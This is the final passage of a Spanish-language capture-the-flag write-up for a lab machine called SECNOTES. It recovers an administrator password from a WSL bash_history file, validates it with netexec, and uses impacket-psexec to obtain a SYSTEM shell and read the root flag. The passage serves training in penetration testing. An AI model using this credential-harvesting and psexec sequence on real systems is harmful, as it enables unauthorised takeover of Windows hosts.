</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                snap                                                                  
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                srv                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span> PM                sys                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">22</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">25</span> PM                tmp                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">02</span> PM                usr                                                                   
</span></span><span style="display:flex;"><span>da----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">03</span> PM                var                                                                   
</span></span><span style="display:flex;"><span>-a----        <span style="color:#ae81ff">6</span>/<span style="color:#ae81ff">22</span>/<span style="color:#ae81ff">2018</span>   <span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">25</span> PM          <span style="color:#ae81ff">87944</span> init                                     
</span></span></code></pre></div><p>Viendo el archivo <code>/root/.bash_history</code> encontramos una línea interesante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root&gt; type .bash_history
</span></span><span style="display:flex;"><span>cd /mnt/c/
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>cd Users/
</span></span><span style="display:flex;"><span>cd /
</span></span><span style="display:flex;"><span>cd ~
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>pwd
</span></span><span style="display:flex;"><span>mkdir filesystem
</span></span><span style="display:flex;"><span>mount //<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>/c$ filesystem/
</span></span><span style="display:flex;"><span>sudo apt install cifs-utils
</span></span><span style="display:flex;"><span>mount //<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>/c$ filesystem/
</span></span><span style="display:flex;"><span>mount //<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>/c$ filesystem/ -o user=administrator
</span></span><span style="display:flex;"><span>cat /proc/filesystems
</span></span><span style="display:flex;"><span>sudo modprobe cifs
</span></span><span style="display:flex;"><span>smbclient
</span></span><span style="display:flex;"><span>apt install smbclient
</span></span><span style="display:flex;"><span>smbclient
</span></span><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;administrator%u6!4ZwgwOM#^OBf#Nwnh&#39;</span> \\\\<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>\\c$
</span></span><span style="display:flex;"><span>&gt; .bash_history 
</span></span><span style="display:flex;"><span>less .bash_history
</span></span><span style="display:flex;"><span>exit
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>smbclient -U <span style="color:#e6db74">&#39;administrator%u6!4ZwgwOM#^OBf#Nwnh&#39;</span> <span style="color:#ae81ff">\\\\</span>127.0.0.1<span style="color:#ae81ff">\\</span>c$
</span></span></code></pre></div><p>Parecen credenciales del administrador del sistema.</p>
<p>Las podemos comprobar con <code>netexec</code> y son válidas.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nxc smb 10.129.18.0 -u Administrator -p <span style="color:#e6db74">&#39;u6!4ZwgwOM#^OBf#Nwnh&#39;</span>
</span></span><span style="display:flex;"><span>SMB         10.129.18.0     <span style="color:#ae81ff">445</span>    SECNOTES         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> Enterprise <span style="color:#ae81ff">17134</span> <span style="color:#f92672">(</span>name:SECNOTES<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:SECNOTES<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.18.0     <span style="color:#ae81ff">445</span>    SECNOTES         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SECNOTES<span style="color:#ae81ff">\A</span>dministrator:u6!4ZwgwOM#^OBf#Nwnh <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Para terminar, teniendo estas credenciales y con <code>psexec</code> podemos ganar una consola como <code>nt authority\system</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ impacket-psexec -target-ip 10.129.18.0 Administrator:<span style="color:#e6db74">&#39;u6!4ZwgwOM#^OBf#Nwnh&#39;</span>@10.129.18.0
</span></span><span style="display:flex;"><span>Impacket v0.11.0 - Copyright <span style="color:#ae81ff">2023</span> Fortra
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.129.18.0.....
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file pNVSROjb.exe
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.129.18.0.....
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service vyBL on 10.129.18.0.....
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service vyBL.....
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17134.228<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32&gt; whoami
</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
</span></span></code></pre></div><p>Podríamos leer la flag de <code>root</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Users\Administrator\Desktop&gt; type root.txt
</span></span><span style="display:flex;"><span>79da3473ede54ef8...
</span></span></code></pre></div><p>¡Y ya estaría!</p>
<p>Happy Hacking! 🚀</p>

    </div>

    

            </div>
        </div><footer class="text-center pb-1">
    <small class="text-muted">
        
            &copy; 2024, Andrés Del Cerro
        
        <br>
        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
    </small>
</footer>
</body>
</html>
